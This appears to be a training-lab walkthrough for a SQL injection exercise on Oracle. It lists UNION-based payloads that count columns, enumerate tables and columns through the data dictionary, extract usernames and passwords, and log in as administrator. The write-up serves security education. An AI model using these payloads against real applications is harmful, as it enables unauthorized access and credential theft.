## SQL injection attack, listing the database contents on Oracle

**Category:** sqli
**Difficulty:** Medium

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. The database is Oracle.

### Solution Steps
1. Identify injection point in the category parameter
2. On Oracle, every SELECT must include FROM - use the dual table for testing
3. Determine number of columns: `'+UNION+SELECT+NULL,NULL+FROM+dual--`
4. Test which columns accept strings: `'+UNION+SELECT+'abc','def'+FROM+dual--`
5. Query all tables from Oracle's data dictionary:
6. `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
7. Find the users table (may have random suffix like USERS_ABCDEF)
8. Query columns in the users table:
9. `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
10. Identify username and password columns (may have suffixes)
11. Extract credentials:
12. `'+UNION+SELECT+USERNAME_ABCDEF,PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
13. Login as administrator with extracted password

### Key Payloads
- `administrator`
- `dual`
- `category`
- `'+UNION+SELECT+NULL,NULL+FROM+dual--`
- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
- `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
- `'+UNION+SELECT+USERNAME_ABCDEF,PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`

### Indicators of Success
- UNION SELECT FROM dual returns valid response
- all_tables query returns table names
- Column names extracted from all_tab_columns
- Username and password data retrieved
- Administrator login successful

---
*Source: PortSwigger Web Security Academy*
